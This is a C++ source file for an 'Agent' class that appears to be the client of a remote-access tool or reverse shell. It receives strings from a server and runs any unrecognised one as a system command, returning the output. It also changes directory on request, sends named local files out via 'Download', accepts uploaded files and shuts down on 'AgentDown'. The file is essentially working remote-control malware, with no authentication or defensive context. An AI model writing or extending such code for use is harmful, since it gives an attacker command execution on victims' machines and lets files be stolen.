#include "Agent.h"

void Agent::OnConnect(Connection connection)
{
	Packet packet;
	std::filesystem::path path = std::filesystem::current_path();

	packet.InsertString(path.string() + ">");
	connection.Send(packet);
}


bool Agent::ShutDown()
{
	if (not connSocket.Close())
	{
		std::cerr << "Error at Close." << std::endl;
		return false;
	}
	
	return true;
}

bool Agent::Logic()
{
	Packet packet;

	if (not serverConn.Recv(packet))
	{
		return false;
	}

	std::string cmd = packet.ExtractString();

	if (cmd.rfind("AgentDown", 0) == 0)
	{
		std::cout << "[+] Shutting down agent..." << std::endl;
		return false;
	}

	else if (cmd.rfind("cd ", 0) == 0)
	{
		if (not command.SetCurrentPath(cmd))
		{
			std::string pathErr = "The system cannot find the path specified.";
			packet.Clear();
			packet.InsertString(pathErr);

			if (not serverConn.Send(packet))
			{
				std::cerr << "Error at Send (path error)." << std::endl;
				return false;
			}
		}
	}

	else if (cmd.rfind("Download ", 0) == 0)
	{
		std::string filename = cmd.substr(cmd.find(' ') + 1);
		
		if (not serverConn.SendFile(filename))
		{
			std::cerr << "Error at Sendfile." << std::endl;
			return false;
		}
	}

	else if (cmd.rfind("Upload ", 0) == 0)
	{
		if (not serverConn.RecvFile())
		{
			std::cerr << "Error at RecvFile." << std::endl;
			return false;
		}
	}

	else
	{
		if (not command.Execute(cmd))
		{
			std::cerr << "Error at Execute" << std::endl;
			return false;
		}
		std::string cmdOutput = command.GetCmdOutput();

		packet.Clear();
		packet.InsertString(cmdOutput);

		if (not serverConn.Send(packet))
		{
			std::cerr << "Error at Send (command output)." << std::endl;
			return false;
		}
	}
	
	packet.Clear();
	packet.InsertString(command.GetCurrentPath());

	if (not serverConn.Send(packet))
	{
		std::cerr << "Error at Send (pwd)." << std::endl;
		return false;
	}

	return true;
}
